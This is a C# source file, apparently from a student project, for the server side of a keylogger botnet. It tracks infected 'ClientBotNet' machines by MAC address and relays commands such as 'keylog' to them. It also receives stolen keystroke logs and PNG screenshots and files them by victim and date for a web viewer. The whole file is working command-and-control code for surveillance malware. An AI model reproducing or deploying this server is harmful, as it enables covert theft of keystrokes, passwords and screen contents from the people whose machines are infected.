using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using static System.Net.Mime.MediaTypeNames;
using System.IO;
using System.Threading.Tasks;
using System.Drawing;
using System.Drawing.Imaging;
using SocketServer.CSDL;

namespace SocketServer
{
    class Program
    {
        public static List<ClientBotNet> listClient = new List<ClientBotNet>();
        public static void HandleMessage(string message)
        {
            //Message format : MAC/Message -> Message:005056C00001/keylog -abc
            string mac = message.Substring(8, 12);
            string request = message.Substring(21);
            Console.WriteLine("mac in handle: " + mac);
            Console.WriteLine("request: " + request);
            foreach (ClientBotNet bot in listClient)
            {
                Console.WriteLine("bot net mac address: " + bot.MacAddress);
                Console.WriteLine("mac address in handle: " + mac);
                if (bot.MacAddress.Trim().Equals(mac.Trim()))
                {
                    Console.WriteLine("handle");
                    byte[] sendData = new byte[1024];
                    sendData = Encoding.ASCII.GetBytes(request);
                    bot.socket.Send(sendData);
                    Console.WriteLine("sending to " + mac + " " + request);
                    break;
                }
            }
        }
        public static void AddToList(ClientBotNet bot, string mac)
        {
            Console.WriteLine("mac: " + mac);
            for(int i = 0; i < listClient.Count; i++)
            {
                if(listClient[i].MacAddress.Equals(mac))
                {
                    listClient[i] = bot;
                    break;
                }
            }
            //if non exist
            listClient.Add(bot);
        }

        public static bool ReciveFile(Socket clientSocket)
        {
            string path = @"G:\\Document5\\PBL4\\KeyLogWeb\\KeyLogWebApp\\KeyLogWebApp\\Content\\Data\\";
            Console.WriteLine("getting file....");
            byte[] clientData = new byte[1024 * 5000];

            int receivedBytesLen = clientSocket.Receive(clientData);
            int fileNameLen = BitConverter.ToInt32(clientData, 0);
            string message = Encoding.ASCII.GetString(clientData).Trim('\0');
            if (message.Contains("Message:") && message.Length < 50)
            {
                //Xu ly thong diep
                Console.WriteLine(message);
                HandleMessage(message);
                return false;
            }
            if (message.Contains("MacAddress:") && message.Length < 50)
            {
                //Add vao list
                Console.WriteLine(message);
                string IDMacAddrress = message.Substring(11);  
                
                ClientBotNet clientBotNet = new ClientBotNet(clientSocket, IDMacAddrress);
                AddToList(clientBotNet, IDMacAddrress);
                //string type = 
                // Luu CSDL
                if (!SaveData.Instance.CheckUser(IDMacAddrress))
                {
                    SaveData.Instance.AddUser(IDMacAddrress, true, IDMacAddrress);
                                   
                }
                SaveData.Instance.AddFolder(DateTime.Now.ToString("dd-MM-yyyy"), "Image", IDMacAddrress);

                SaveData.Instance.AddFolder(DateTime.Now.ToString("dd-MM-yyyy"), "Text", IDMacAddrress);
                return false;
            }

            string fileNameDefault = Encoding.ASCII.GetString(clientData, 4, fileNameLen);
            string fileName = fileNameDefault.Substring(fileNameDefault.Length -38);
            string IdMac = fileName.Substring(0, 12);

            string subFileName = fileName.Substring(fileName.Length - 25);
            //
            string TimeReceive = subFileName.Substring(0, 10);
            //
            string Type = subFileName.Substring(subFileName.Length - 3);
            //
            Console.WriteLine(Type);
            
            BinaryWriter bWrite = new BinaryWriter(File.Open(path + subFileName, FileMode.Append));
            bWrite.Write(clientData, 4 + fileNameLen, receivedBytesLen - 4 - fileNameLen);

            while (receivedBytesLen != 0)
            {
                try
                {
                    receivedBytesLen = clientSocket.Receive(clientData, clientData.Length, 0);
                    bWrite.Write(clientData, 0, receivedBytesLen);
                   
                }
                catch (Exception ex)
                {
                    Console.WriteLine("close2");
                    ex.ToString();
                    bWrite.Close();
                    return false;
                }

            }
            Console.WriteLine(fileName);
            Console.WriteLine("id mac : " + IdMac);
            bWrite.Close();
            Console.WriteLine("close3");
            clientSocket.Close();
            string typeOfFile = subFileName.Substring(subFileName.Length - 3).Equals("png") ? "Image" : "Text";
            SaveData.Instance.AddFileDetail(subFileName, TimeReceive , typeOfFile);
            
            return true;
        }
        static void Main(string[] args)
        {
            

            IPAddress ipAddress = IPAddress.Parse("192.168.1.69");
            Console.WriteLine("Starting TCP listener...");

            IPEndPoint ipEnd = new IPEndPoint(ipAddress, 3004);
            Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); ;
            serverSocket.Bind(ipEnd);

            serverSocket.Listen(3004);
            Console.WriteLine(" >>> " + "Server Started");
            while (true)
            {
                Socket clientSocket = serverSocket.Accept();
                new Thread(delegate ()
                {
                    try
                    {
                        bool isFinish = ReciveFile(clientSocket);
                        if(isFinish)
                        {
                            return;
                        }
                    }
                    catch(Exception ex)
                    {
                        //ex.ToString();
                        Console.WriteLine(ex);
                    }
                    
                }).Start();
            }
        }
    }
}
//public User(string detail, bool status, string macAddress)
//{
//    this.ID_User = macAddress;
//    this.Detail = detail;
//    this.Status = status;
//    this.MacAddress = macAddress;
//}